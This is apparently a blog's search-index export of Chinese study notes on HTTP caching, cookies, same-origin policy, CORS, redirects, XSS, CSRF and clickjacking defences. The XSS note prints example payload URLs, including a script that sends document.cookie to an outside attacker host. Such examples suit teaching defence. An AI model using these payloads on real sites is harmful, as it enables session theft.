不频繁更新的文件会使用特定的命名方式：在URL后面（通常是文件名后面）会加上版本号。加上版本号后的资源就被视作一个完全新的独立的资源，同时拥有一年甚至更长的缓存过期时长。但是这么做也存在一个弊端，所有引用这个资源的地方都需要更新链接。web开发者们通常会采用自动化构建工具在实际工作中完成这些琐碎的工作。当低频更新的资源（js/css）变动了，只用在高频变动的资源文件（html）里做入口的改动。 这种方法还有一个好处：同时更新两个缓存资源不会造成部分缓存先更新而引起新旧文件内容不一致。对于互相有依赖关系的css和js文件，避免这种不一致性是非常重要的。 浏览器缓存 200 ok : 从原始服务器请求成功 200 ok from cache : 从缓存中获取，未向服务器验证新鲜度 200 ok from disk cache : 从磁盘中获取（已缓存到磁盘中，如CSS样式等） 200 ok from memory cache : 从内存中获取（已缓存到磁盘并存在内存中，如脚本、字体、图片等） 304 not modified ：向服务器发送请求，验证新鲜度，足够新鲜，服务器会返回 304状态 页面刷新 当 F5 刷新页面时，跳过强缓存功能，检查协商缓存（与在地址栏中输入url的作用一样） 当 Ctrl + F5 刷新页面时，跳过强缓存和协商缓存 （直接从服务器中加载）","categories":[{"name":"HTTP","slug":"HTTP","permalink":"https://xuxb.github.io/categories/HTTP/"}],"tags":[{"name":"HTTP","slug":"HTTP","permalink":"https://xuxb.github.io/tags/HTTP/"}]},{"title":"Cookie","slug":"Web 安全/cookie","date":"2021-01-14T07:45:00.000Z","updated":"2021-04-30T07:22:51.262Z","comments":true,"path":"2021/01/14/Web 安全/cookie/","link":"","permalink":"https://xuxb.github.io/2021/01/14/Web%20%E5%AE%89%E5%85%A8/cookie/","excerpt":"","text":"CookieCookieCookie是网站为了辨别用户身份、进行 session 跟踪而储存在用户本地终端上的数据，是实现持久会话的最好方式 cookie 属性| 选项 | 作用 || — | — || name | 设置 cookie 的名称 || value | 设置 cookie 的值 || domain | 设置可以访问此 cookie 的域名 || path | 设置可以访问此 cookie 的页面路径，比如domain是abc.com,path是/test，那么只有/test路径下的页面可以读取此cookie || expires/Max-Age | 设置字段为此cookie超时时间。若设置其值为一个时间，那么当到达此时间后，此cookie失效。不设置的话默认值是Session，意思是cookie会和session一起失效。当浏览器关闭(不是浏览器标签页，而是整个浏览器) 后，此cookie失效。 || size | 表示此 cookie 大小 || http | 设置 cookie 的 httponly 属性。若此属性为true，则只有在http请求头中会带有此cookie的信息，而不能通过document.cookie来访问此cookie。 || secure | 设置是否只能通过https来传递此条cookie || sameSite | 允许服务器要求某个cookie在跨站请求时不会被发送，从而可以阻止跨站请求伪造攻击（CSRF）| SameSite Cookies 可选字段 None: 浏览器会在同站请求、跨站请求下继续发送cookies，不区分大小写 Lax: 在新版本浏览器中，为默认选项，Same-site cookies 将会为一些跨站子请求保留，如图片加载或者frames的调用，但只有当用户从外部站点导航到URL时才会发送。如 link链接，预加载请求，GET 表单 Strict: 浏览器将只在访问相同站点时发送cookie。 Cookie 的分类 会话Cookie：不包含过期时间，该Cookie保存在内存中，当浏览器关闭时该Cookie失效 持久性Cookie：包含过期时间，该Cookie保存在硬盘内，当到达指定日期时，该Cookie失效 123&#x2F;&#x2F; 响应头中设置 CookieSet-Cookie: name1&#x3D;value1 [ ;expires&#x3D;date][ ;domain&#x3D;domain][ ;path&#x3D;path][ ;secure]Set-Cookie: name2&#x3D;value2 [ ;expires&#x3D;date][ ;domain&#x3D;domain][ ;path&#x3D;path][ ;secure] 12&#x2F;&#x2F; 请求头中的 CookieCookie: name1&#x3D;value1; name2&#x3D;value2; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859// js 操作 Cookie/** * 根据cookie名称获取cookie值 * @param &#123;String&#125; name cookie名称 * @return &#123;[type]&#125; [description] */function getCookie(name) &#123; var arr = document.cookie.match(new RegExp(&quot;(^|\\\\W)&quot; + name + &quot;=([^;]*)(;|$)&quot;)); if (arr !== null) &#123; return decodeURIComponent(arr[2]); &#125; return &#x27;&#x27;;&#125;/** * @param &#123;Object&#125; options 参数配置 * @param &#123;String&#125; options.name cookie的名称 * @param &#123;String&#125; options.value cookie的值 * @param &#123;String&#125; options.domain cookie访问权限域名，默认为当前域名 * @param &#123;String&#125; options.path 默认为 / * @param &#123;Date&#125; options.expires 如果不设置或不是 Date 类型，则默认为会话 cookie * @return &#123;scope&#125; this */function setCookie(options) &#123; var name = options.name; var value = options.value; var path = options.path || &quot;/&quot;; var domain = options.domain; var expires = options.expires; var str = name + &quot;=&quot; + escape(value) + &quot;; &quot;; str += &quot;path=&quot; + path + &quot;; &quot;; if (domain) &#123; str += &quot;domain=&quot; + domain + &quot;; &quot;; &#125; if (expires instanceof Date) &#123; str += &quot;expires=&quot; + expires.toGMTString() + &quot;; &quot;; &#125; document.cookie = str; return this;&#125;/*** 删除 cookie* @param &#123;String&#125; name cookie 名称* @param &#123;String&#125; domain cookie 域* @param &#123;String&#125; path cookie 路径* @return &#123;scope&#125; this*/function deleteCookie(name, domain, path) &#123; this.set(&#123; name: name, value: &#x27;&#x27;, domain: domain, path: path, expires: new Date() &#125;); return this;&#125; SessionSession 是一种服务器端机制，具有保持连接的含义。当浏览器第一次访问时，服务器创建 Session，然后将 Session的 Id 以 Cookie 的形式发送回给浏览器，后续的访问会带上 Cookie，可用于识别用户，起到面向连接的作用。 Session 对象在一段时间（如20min）没被使用，就会被销毁，或手动销毁 Session 注意事项 用户访问某个网站，登录成功后，服务器后生成一个 Session 对象，并设置失效时间，用于跟踪用户的操作和状态，并将Session产生的唯一标识符保存在Cookie中（即通过 Set-Cookie 响应头返回给浏览器，假设为 SessionId ），在一段时间内，用户访问其他页面时，会将Cookie（包含SessionId）传回给服务器，以此模拟”登陆态”功能。 当用户关闭浏览器时，浏览器并不会发送任何信息到服务器，因此服务器端的 Session 依然有效，直到 Session 超过设置的时间，若这段时间内获取 SessionId 的值并传给服务器（如CSFR、XSS），依然可以保持为登陆状态，并获取该用户的所有权限。 session 在服务器端用类似于 Map 结构的形式存储，当标签页或浏览器关闭时并不会通知到后端清除 sessionsessionStorage 用于存储前端数据，当标签页或浏览器关闭时 sessionStorage 中的数据会被清除","categories":[{"name":"Web 安全","slug":"Web-安全","permalink":"https://xuxb.github.io/categories/Web-%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"web 安全","slug":"web-安全","permalink":"https://xuxb.github.io/tags/web-%E5%AE%89%E5%85%A8/"},{"name":"cookie","slug":"cookie","permalink":"https://xuxb.github.io/tags/cookie/"}]},{"title":"同源策略（SOP）","slug":"Web 安全/同源策略(SOP)","date":"2021-01-14T07:44:00.000Z","updated":"2021-04-30T07:34:20.135Z","comments":true,"path":"2021/01/14/Web 安全/同源策略(SOP)/","link":"","permalink":"https://xuxb.github.io/2021/01/14/Web%20%E5%AE%89%E5%85%A8/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5(SOP)/","excerpt":"","text":"同源策略（SOP）同源策略（Same Origin Policy） 定义：除非所处的两个页面的协议、DNS域名、端口都完全一致，否则两个独立的 JavaScript 运行环境不能访问彼此的 DOM，其他任何跨文档的 JavaScript DOM 访问也会失败。 说明：两个 URL 的协议、域名和端口相同，则表示他们同源。对于不同源的 document 或脚本，对当前 document 读取或设置某些属性。 协议、元素、端口三者组成的算法叫做 源。 同源策略开始时只是用于现在对 DOM 结构的访问，之后扩展为保护 JavaScript 对跟对象下的某些敏感数据，如 cookie、localStoreage、Ajax 请求等，但同源策略机制并非包含所有，如非同源的脚本对任意窗口调用 location.assign() 、location.replace()。 作用：防止跨域读写某些资源，为浏览器提供沙箱环境，使进程在一个相对独立的空间运行，能在一定程度上保护浏览器安全。 同源策略无法和全局身份认证、SSL 状态、网络上下文环境以及众多有浏览器管理涉及安全的其他参数进行同步A 网站载入 B 网站的脚本，则该脚本的源为 A 网站，只有和当前页文档同源的脚本才会被执行在浏览器中，&lt;script&gt;、&lt;img&gt;、&lt;iframe&gt;、&lt;link&gt; 等标签都可以加载跨域资源，而不受同源限制XMLHttpRequest 受到同源策略的约束，不能够跨域访问资源，可通过目标域返回的 HTTP 头来授权是否允许跨域访问 1 跨文档通信的限制（相关网站间通信） 设置 document.domain（比较复杂、同时也有安全问题，不推荐使用） 使用 windown.postMessage、window.onmessage 2 XMLHttpRequest 的同源策略老版本的 XMLHttpRequest Level 1，有如下几个缺点： 只支持文本数据的传送，无法用来读取和上传二进制文件。 传送和接收数据时，没有进度信息，只能提存在 没有完成。 受到”同域限制”（Same Origin: Origin Po时，licy），只能向同一域名的服务器请求数据。 新版本的 XMLHttpRequest Level 2，新增了如下几个功能： 可以设置HTTP请求的时限（超时时间） 可以使用 FormData 对象管理表单数据 可以上传文件（二进制数据） 可以请求不同域名下的数据（跨域请求） 可以获取服务器端的二进制数据 可以获得数据传输的进度信息 跨域资源共享（CORS）是针对 XMLHttpRequrest 的意向建设性扩展，用这种方式发送跨域 HTTP 请求时，由于 XMLHttpRequest 受到同源策略的约束，请求结果会被浏览器拦截，当响应头存在 Access-Control-Allow-Origin: Origin 字段时，XMLHttpRequest 才能访问响应结果 3 Web Storeage 的同源策略localStorage 对象实现的是与站点源性相关的持久存储，关闭浏览器之后 localStorage 任然有效，而 sessionStorage 则绑定了当前浏览器窗口，提供的是临时的缓存机制，在浏览回话结束之后被清除掉。 localStorage 的大小大约为 5M，而 Cookie 的单个大小为 4K localStorage 的值类型限定为 string类型，在读取数据时需要进行一些转换 localStorage 在浏览器的隐私模式下面是不可读取的 localStorage 本质上是对字符串的读取，如果存储内容多的话会消耗内存空间，会导致页面变卡 localStorage 不能被爬虫抓取到 4 Cookie 的安全策略Cookie 的出现要早于同源策略，所以两者在某些方面可能会存在一些问题。 网站服务器对 Cookie 提供了两个特殊的可单独设置的标记： httpOnly 和 secure 。 httpOnly 标签可以禁止使用 document.cookle API 来访问页面的 Cookie ，这样即使页面真的被注入了恶意代码，也无法简单地用这个 API 复制出用户的身份信息。 secure 标签使得 Cookie 无法被用在非加密协议的通道里，这样就必须使用 HTTPS 服务所以能防御主动攻击。 当依赖于 HTTP Cookies 做身份认证时： 使用 httpOnly 标签；设计 Web 应用时谨记不要让 Javascript 直接访问到身份授权的 Cookie 信息。需要把敏感 Cookie 的有效范围设呈得越小越好，最好不要指定 Cookie 的 domain 值。 如果应用是完全墓于 HTTPS 的，那 Cookie 就应该标记为 secure ，而且必须时 Cookie 注入有完善的处理（ HTTP 运行环境可能导致标记为 secure 的 Cookie 被覆盖，即使无法被读取）对 Cookie 进行加密签名也许能防范这种超出控制的墓改行为，但也仍然无法阻止受害者的 Cookie 被替换成另一组由合法方式获取的 Cookie 身份。","categories":[{"name":"Web 安全","slug":"Web-安全","permalink":"https://xuxb.github.io/categories/Web-%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"web 安全","slug":"web-安全","permalink":"https://xuxb.github.io/tags/web-%E5%AE%89%E5%85%A8/"}]},{"title":"跨域资源共享（CORS）","slug":"Web 安全/跨域资源共享(CORS)","date":"2021-01-14T07:43:00.000Z","updated":"2021-04-30T07:33:43.677Z","comments":true,"path":"2021/01/14/Web 安全/跨域资源共享(CORS)/","link":"","permalink":"https://xuxb.github.io/2021/01/14/Web%20%E5%AE%89%E5%85%A8/%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%E5%85%B1%E4%BA%AB(CORS)/","excerpt":"","text":"跨域资源共享（CORS）跨域资源共享（Cross-Origin Resource Sharing） A 网站可以请求 B 网站的图片、字体、CSS文件、javascript文件等，该请求是一个跨域请求，但出于安全考虑，浏览器会限制 javascript 发起的跨域请求，即 XMLHttpRequest 和 Fetch 必须遵循同源策略。 跨域请求分为简单请求和复杂请求 对于简单请求，可将请求直接发送到另一个域的服务器 对于复杂请求，会首先发送一个预检请求到另一个域的服务器（使用 Options 方法），以此来获知服务器是否允许该实际请求 如果预检请求返回结果中，服务器允许了实际请求，即响应头中包含了 Access-Control-Allow-Origin、Access-Control-Allow-Headers 等信息，则再发送一个实际请求 如果预检请求失败，服务器不允许实际请求，如响应报文未包含了正确CORS响应头，那么实际请求会被浏览器拦截，并可在控制台中看到报错信息 所以跨域请求失败的原因，其实是从预检请求中得知另一个域的服务器不支持跨域，而导致真实的请求被浏览器拦截，因此浏览器肯定会发起至少一次跨站请求（简单请求、预检请求或者预检请求 + 复杂请求） javascript 要实现 CORS 需要浏览器和服务器同时支持，（现代浏览器 IE10+） 对于现代浏览器，在发起跨域 ajax 请求时 ，会添加 Origin 字段，表明请求来自哪个源 对于服务器端，须在响应头中添加 Access-Control-Allow-Origin 字段，表示接受某一域名的请求 相比 JSONP ，CORS 更加安全，可靠； JSONP 只能实现 GET 请求，而 CORS 支持所有类型的 HTTP 请求； CORS 比 JSONP 有更好的错误处理，并能携带更多的数据； 123456789101112131415161718GET &#x2F;resources&#x2F;public-data&#x2F; HTTP&#x2F;1.1Host: bar.otherUser-Agent: Mozilla&#x2F;5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3pre) Gecko&#x2F;20081130 Minefield&#x2F;3.1b3preAccept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8Accept-Language: en-us,en;q&#x3D;0.5Accept-Encoding: gzip,deflateAccept-Charset: ISO-8859-1,utf-8;q&#x3D;0.7,*;q&#x3D;0.7Connection: keep-aliveReferer: http:&#x2F;&#x2F;foo.example&#x2F;examples&#x2F;access-control&#x2F;simpleXSInvocation.htmlOrigin: http:&#x2F;&#x2F;foo.example&#96;&#96;HTTP&#x2F;1.1 200 OKDate: Mon, 01 Dec 2008 00:23:53 GMTServer: Apache&#x2F;2.0.61 Access-Control-Allow-Origin: *Keep-Alive: timeout&#x3D;2, max&#x3D;100Connection: Keep-AliveTransfer-Encoding: chunkedContent-Type: application&#x2F;xml 某些请求不会触发 CORS 预检请求。本文称这样的请求为“简单请求”，请注意，该术语并不属于 Fetch （其中定义了 CORS）规范。若请求满足所有下述条件，则该请求可视为“简单请求”： 使用下列方法之一： GET HEAD POST Fetch 规范定义了对 CORS 安全的首部字段集合，不得人为设置该集合之外的其他首部字段。该集合为：Accept Accept-Language Content-Language Content-Type DPR Downlink Save-Data Viewport-Width Width Content-Type 的值仅限于下列三者之一：text/plain multipart/form-data application/x-www-form-urlencoded 请求中的任意XMLHttpRequestUpload 对象均没有注册任何事件监听器；XMLHttpRequestUpload 对象可以使用 XMLHttpRequest.upload 属性访问。 请求中没有使用 ReadableStream 对象。","categories":[{"name":"Web 安全","slug":"Web-安全","permalink":"https://xuxb.github.io/categories/Web-%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"web 安全","slug":"web-安全","permalink":"https://xuxb.github.io/tags/web-%E5%AE%89%E5%85%A8/"}]},{"title":"HTTP 请求与重定向","slug":"HTTP/HTTP 请求与重定向","date":"2021-01-14T07:42:00.000Z","updated":"2021-04-30T07:19:35.360Z","comments":true,"path":"2021/01/14/HTTP/HTTP 请求与重定向/","link":"","permalink":"https://xuxb.github.io/2021/01/14/HTTP/HTTP%20%E8%AF%B7%E6%B1%82%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/","excerpt":"","text":"HTTP 请求与重定向幂等方法幂等：指无论调用多少次都是相同的作用（对于资源而言） 幂等方法：GET、DELETE、PUT、HEAD 非幂等方法：POST、PATCH HTTP请求方法 方法 作用 安全性 幂等性 GET 查询 是 是 POST 新增 否 否 PUT 更新 否 是 DELETE 删除 否 是 PATCH 局部更新 否 否 在HTTP1.0中，对于301、302的 location 中包含的重定向url，如果请求method不是GET或者HEAD，那么浏览器是禁止自动重定向的，除非得到用户的确认，因为POST、PATCH等请求是非冥等的（也就是再次请求时服务器的资源可能已经发生了变化） 虽然rfc明确了上述的规定，但是很多的浏览器不遵守这条规定，无论原来的请求方法是什么都会自动用GET方法重定向到location指定的url。就是说现存的很多浏览器在遇到POST请求返回301、302状态码的时候自动用GET请求location中的url，无需用户确认。 为了解决这种不规范的问题，HTTP 1.1中新增了303、307状态码，用来明确服务器期待客户端进行何种反应。 303状态码，指客户端可以自动用GET方法重定向请求location中的url，无需用户确认。无论之前是 GET 方式还是 POST 方式。 307状态码，指客户端需要遵守原本301、302的规定，除GET、HEAD方法外，其他的请求方法必须等客户确认才能跳转。 301：（Permanently Moved）永久重定向 302：（Temporarily Moved）临时重定向。标准规定，不允许客户端在重定向时改变请求的方法，但浏览器并未遵循该标准（303/307 为 HTTP/1.1 标准，用于解决 302 的问题） 303：会使用GET方式访问在Location中规定的URI，而无视原先请求的方法 307：对于非GET、HEAD请求，浏览器会自动禁止重定向，除非得到用户确认 302 网址劫持： 指利用域 A 上的一个页引用有高质量更新内容的域 B。这样基于从域B“偷来”的更新内容，这个页面会有较好的排名。并且利用伪装方式，将用户重定向到另一个页面。（主要通过窃取的内容、PR来获取搜索引擎较好的排名） 重定向与转发 请求重定向：客户端行为，相当于两次请求，前一次的请求对象不保存，URL改变 请求转发：服务器端行为，是一次请求，前一次的请求对象保存，URL不改变","categories":[{"name":"HTTP","slug":"HTTP","permalink":"https://xuxb.github.io/categories/HTTP/"}],"tags":[{"name":"HTTP","slug":"HTTP","permalink":"https://xuxb.github.io/tags/HTTP/"}]},{"title":"跨站脚本攻击 (XSS)","slug":"Web 安全/跨站脚本攻击(XSS)","date":"2021-01-14T07:42:00.000Z","updated":"2021-05-11T02:17:50.503Z","comments":true,"path":"2021/01/14/Web 安全/跨站脚本攻击(XSS)/","link":"","permalink":"https://xuxb.github.io/2021/01/14/Web%20%E5%AE%89%E5%85%A8/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB(XSS)/","excerpt":"","text":"跨站脚本攻击 (XSS)跨站脚本攻击 XSS (Cross Site Scripts) 说明：攻击者盗取用户的身份信息（如Cookie）、导航到恶意网址、携带木马病毒等 原理：攻击者在网页中嵌入客户端脚本(如JavaScript), 用户浏览网页就会触发恶意脚本执行 1. 反射型XSS步骤 用户正常登录Web应用程序，登录成功会得到一个会话信息的 cookie 攻击者将含有攻击代码的URL发送给被攻击人，例：http://fovweb.com/xss/message.php?send=%3Cscript%3Edocument.write(‘%3Cimg%20height=0%20width=0%20src=%22 http://hacker.fovweb.com/xss/cookie_save.php%3Fcookie=%3D’%20+%20encodeURL(document.cookie)%20+%20’%22/%3E’)%3C/script%3E 用户打开攻击者发送过来的 URL, Web 应用程序执行用户发出的请求，并将请求参数显示在页面中； 请求参数中包含的 JavaScript 代码会被执行，用户的 cookie 信息将会被发送到攻击者； note: 链接中的请求参数会被显示在页面中，如搜索关键字、表单输入框等 链接必须被用户点击才会触发 危害范围小，受害者人数较少 例子：http://health.sohu.com/so/index.shtml?t=news&amp;wd=%E6%84%9F%E5%86%92%27%22onmouseover=%22alert(document.cookie)%22 2. 持久型 XSS 步骤 攻击者向存在漏洞的网站注入恶意代码，如http://a.com/a.jsp?name=xss&lt;script src=http://b.com/b.js&gt;&lt;/script&gt; 用户访问该网站会下载 js 文件，并执行里面的代码 js 可获取用户所有的所有信息（包括Cookie、Session等）并发送给攻击者 note： 攻击者提交的数据会被显示出来，并被所有人看到，如社区评论等 访问存在漏洞的网站就会触发 危害范围大，受害者人数较多 3. 防御措施 设置 Content-Security-Policy 头信息（HTTP 头信息、html 的 meta 标签），控制浏览器能够为指定的页面加载哪些资源 在服务器端设置 Cookie 为 http-only，浏览器会禁止 js 访问该 Cookie 输入检查，对用户提交的数据进行校验，对特殊字符进行编码和过滤（主要在后端） 输出检查，对渲染到 html 中的内容进行 htmlEncode（主要在前端） 针对不同的上下文调用不同的转义规则，如 HTML 属性、HTML 文字内容、HTML 注释、跳转链接、内联 JavaScript 字符串、内联 CSS 样式表等，所需要的转义规则不一致 利用模板引擎，避免内联事件，避免拼接 HTML 参考 Content-Security-Policy文档","categories":[{"name":"Web 安全","slug":"Web-安全","permalink":"https://xuxb.github.io/categories/Web-%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"web 安全","slug":"web-安全","permalink":"https://xuxb.github.io/tags/web-%E5%AE%89%E5%85%A8/"}]},{"title":"跨站请求伪造 (CSRF)","slug":"Web 安全/跨站请求伪造(CSRF)","date":"2021-01-14T07:41:00.000Z","updated":"2021-05-11T02:35:07.355Z","comments":true,"path":"2021/01/14/Web 安全/跨站请求伪造(CSRF)/","link":"","permalink":"https://xuxb.github.io/2021/01/14/Web%20%E5%AE%89%E5%85%A8/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0(CSRF)/","excerpt":"","text":"跨站请求伪造 (CSRF)跨站请求伪造 （Cross-Site Request Forgery ，简称为 CRFR/XSRF) 说明：攻击者盗取用户的身份信息，以用户的名义进行恶意操作（数据查询、转账、删除等） 原理：CSRF 攻击是源于 WEB 的隐式身份验证机制（几乎都是使用 Cookie 来识别用户身份以及保存会话状态）。WEB 的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的，因为服务器并不知道 Get、Post 请求是从哪个页面发出，而浏览器默认给每个请求添加 Cookie 信息。 note: 同源策略仅仅阻止了第三方站点读取来自其他站点的内容，但是却没有防止这些第三方站点向其他站点发出请求。因为 CSRF 攻击是由于某些请求被发出（而引起在服务器端执行了某些动作）所引起的，所以同源策略只能用来保护第三方站点上的数据的私密性，但是同源策略无法防止 CSRF 攻击。 完成 CSFR 攻击必须有以下两个步骤: 登录受信任网站A，并生成 Cookie 在网站 A Cookie 有效期间，登录危险网站 B 关闭tab页面或浏览器，并不能结束 Session （Cookie 中的 sessionId依然有效，重新登录时会复写） 危险网站B可能是存在漏洞并受到攻击（XSS 攻击）的大型知名网站 **CSFR 防御 **（主要在服务器端完成） 生成随机 Token，提交表单时服务器会进行对比 （推荐） 在后端返回 HTML或用户登录后，将 CSFR 令牌（Token）存放在 Token 中，之后的请求再将 Token 放在请求头 (如 x-csfr-token) 中 (推荐) 使用 Same-Site 属性，部分浏览器支持 Strict：最严格，完全禁止第三方 Cookie，跨站点时，任何情况下都不会发送 Cookie （当前网页的 URL 与请求目标一致，才会带上 Cookie） Lax：规则稍稍放宽，大多数情况也是不发送第三方 Cookie，但是导航到目标网址的 Get 请求除外 None：显式关闭 SameSite 属性，前提是必须同时设置 Secure 属性（Cookie 只能通过 HTTPS 协议发送） 表单中添加图片验证码或者一个伪随机数 检查请求头中的 referer 字段，并不一定会带上该字段（可用户图片防盗链，只允许站内使用）","categories":[{"name":"Web 安全","slug":"Web-安全","permalink":"https://xuxb.github.io/categories/Web-%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"web 安全","slug":"web-安全","permalink":"https://xuxb.github.io/tags/web-%E5%AE%89%E5%85%A8/"}]},{"title":"点击劫持","slug":"Web 安全/点击劫持","date":"2021-01-14T07:40:00.000Z","updated":"2021-05-11T02:40:39.441Z","comments":true,"path":"2021/01/14/Web 安全/点击劫持/","link":"","permalink":"https://xuxb.github.io/2021/01/14/Web%20%E5%AE%89%E5%85%A8/%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81/","excerpt":"","text":"点击劫持点击劫持(UI 覆盖攻击)是攻击者使用一个透明的、不可见的 iframe，覆盖在一个网页上，通过调整 iframe 的位置，诱使用户恰好点击在 iframe 页面的一些功能性按钮上 操作步骤 访问者被恶意网页吸引。此处略过如何被吸引的。 页面上存在一个看起来无害的链接（比如：“马上有钱” 或者 “点我，超好玩！”）。 恶意网页在该链接之上放置一个透明 &lt;iframe&gt; 标签，其中 src 指向 facebook.com，如此一来，“点赞” 按钮恰好在链接上面。通常用 z-index 实现。 如果用户试图点击该链接，实际上是点到了 “点赞” 按钮上。 解决方式在响应头或 meta 标签中使用 X-Frame-Options 可以在响应头中添加，如 X-Frame-Options: DENY 可以在 HTML 的 meta 标签中添加，如 &lt;meta http-equiv=&quot;X-Frame-Options&quot; content=&quot;deny&quot;&gt; 通过 JS 代码来判断，如果窗口是顶层窗口，则正常显示，否则不显示，例如判断 window.top === window.self X-Frame-Options 有三个值: DENY: 表示该页面不允许在 frame 中展示，即便是在相同域名的页面中嵌套也不允许。 SAMEORIGIN: 表示该页面可以在相同域名页面的 frame 中展示。 ALLOW-FROM uri: 表示该页面可以在指定来源的 frame 中展示。 参考 常见 web 安全问题","categories":[{"name":"Web 安全","slug":"Web-安全","permalink":"https://xuxb.github.io/categories/Web-%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"web 安全","slug":"web-安全","permalink":"https://xuxb.github.io/tags/web-%E5%AE%89%E5%85%A8/"}]},{"title":"HTTP 协议","slug":"HTTP/HTTP 协议","date":"2021-01-14T07:39:00.000Z","updated":"2021-04-30T07:19:41.798Z","comments":true,"path":"2021/01/14/HTTP/HTTP 协议/","link":"","permalink":"https://xuxb.github.io/2021/01/14/HTTP/HTTP%20%E5%8D%8F%E8%AE%AE/","excerpt":"","text":"HTTP 协议1、定义HTTP协议即超文本传送协议 (Hypertext Transfer Protocol )，是建立在TCP协议之上的一种应用。HTTP连接最显著的特点是客户端发送的每次请求都需要服务器回送响应，在请求结束后，会主动释放连接。从建立连接到关闭连接的过程称为 “一次连接”。 在HTTP 1.0 中客户端的每次请求都要求建立一次单独的连接，在处理完本次请求后，就自动释放连接。 在HTTP 1.1 中可以在一次连接中处理多个请求，并且多个请求可以重叠进行，不需要等待一个请求结束后再发送下一个请求。 由于 HTTP 在每次请求结束后都会主动释放连接，因此 HTTP 连接是一种”短连接”要保持客户端程序的在线状态，需要不断地向服务器发起连接请求。通常的做法是即时不需要获得任何数据，客户端也保持每隔一段固定的时间向服务器发送一次“保持连接”的请求，服务器在收到该请求后对客户端进行回复，表明知道客户端“在线”。若服务器长时间无法收到客户端的请求，则认为客户端“下线”，若客户端长时间无法收到服务器的回复，则认为网络已经断开。 http报文是在http应用程序之间传递的数据块，这些数据描述了报文的内容和含义，以及数据部分 2、组成报文的组成：起始行、首部、主体 1234567891011121314&#x2F;&#x2F; http 请求报文GET &#x2F;home&#x2F;index.html http&#x2F;1.0 &#x2F;&#x2F;起始行Host: www.abc.com &#x2F;&#x2F;首部Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8 &#x2F;&#x2F;首部&#x2F;&#x2F; http 响应报文HTTP&#x2F;1.0 200 OK &#x2F;&#x2F;起始行Content-type:text&#x2F;plain &#x2F;&#x2F;首部Content-length:19 &#x2F;&#x2F;首部Hi I&#39;m a message! 主体 3、首部头信息 通用首部: 提供报文相关的最基本的信息，可在请求报文、响应报文中使用 Connection: 表示是否需要持久连接 Date: 表示消息发送的时间，服务器响应中要包含这个头部 Cache-Control: 指定请求和响应遵循的缓存机制 Via: 表示从请求到响应经过了哪些代理服务器 请求首部 信息性首部 Host：客户端指定自己想访问的WEB服务器的域名/IP 地址和端口号 Referer：浏览器向WEB 服务器表明自己是从哪个网页URL获得点击当前请求中的网址 Range: 指定第一个字节的位置和最后一个字节的位置 User-Agent：发送操作系统与浏览器的名称与版本号 Accept 首部 Accept：告诉WEB服务器自己接受什么介质类型，/ 表示任何类型，type/* 表示该类型下的所有子类型，type/sub-type Accept-Chartset：浏览器告诉服务器自己能接收的字符集 Accept-Encoding：浏览器申明自己接收的编码方法，通常指定压缩方法，是否支持压缩，支持什么压缩方法（gzip，deflate） Accept-Language：浏览器申明自己接收的语言。语言跟字符集的区别：中文是语言，中文有多种字符集，比如big5，gb2312，gbk等等 条件请求首部 If-Match：如果对象的 ETag 没有改变（对象没有改变），才执行请求的动作，获取文档。 If-None-Macth：如果对象的 ETag 改变了（对象也改变了），才执行请求的动作，获取文档。 If-Modified-Since：如果请求的对象在该头部指定的时间之后修改了，才执行请求的动作（比如返回对象），否则返回代码304，告诉浏览器该对象没有修改。 If-Unmodified-Since：如果请求的对象在该头部指定的时间之后没修改过，才执行请求的动作（比如返回对象）。 安全请求首部 Authorization：当客户端接收到来自WEB服务器的 WWW-Authenticate 响应时，用该头部来回应自己的身份验证信息给WEB服务器 Cookie：由客户端发送，包含在HTTP请求的头部中。注意，只有cookie的domain和path与请求的URL匹配才会发送这个cookie。 代理请求首部 Proxy-Authorization：浏览器响应代理服务器的身份验证请求，提供自己的身份信息。 响应首部 信息性首部 Age：当代理服务器用自己缓存的实体去响应请求时，用该头部表明该实体从产生到现在经过多长时间了 Server：WEB 服务器表明自己是什么软件及版本等信息。例如：Server：Apache/2.0.61 (Unix) Vary：WEB服务器用该头部的内容告诉 Cache 服务器，在什么条件下才能用本响应所返回的对象响应后续的请求。假如源WEB服务器在接到第一个请求消息时，其响应消息的头部为：Content-Encoding: gzip; Vary: Content-Encoding，那么Cache服务器会分析后续请求消息的头部，检查其Accept-Encoding，是否跟先前响应的Vary头部值一致，即是否使用相同的内容编码方法，这样就可以防止Cache服务器用自己Cache里面压缩后的实体响应给不具备解压能力的浏览器。例如：Vary：Accept-Encoding。 安全响应首部 Set-Cookie：由服务器发送，它包含在响应请求的头部中。它用于在客户端创建一个Cookie。 Proxy-Authenticate：代理服务器响应浏览器，要求其提供代理身份验证信息。 Access-Control-Allow-Origin：origin 参数的值指定了允许访问该资源的外域 URI（Ajax 跨域资源共享） 实体首部 信息性首部 Allow：服务器支持哪些请求方法（如GET、POST等）。 Location：表示客户应当到哪里去提取文档，用于将接收端定位到资源的位置（URL）上。Location通常不是直接设置的，而是通过HttpServletResponse的sendRedirect方法，该方法同时设置状态代码为302 实体内容首部 Content-Encoding:告知客户端服务器对实体的主体部分选用的内容编码方式。（gzip/compress/deflate/identity) Content-Language:告知客户端，实体主体使用的自然语言。（中文或英文等语言） Content-Length：表明了实体主体部分的大小。 Content-Location:给出与报文主体返回资源对应的URI。 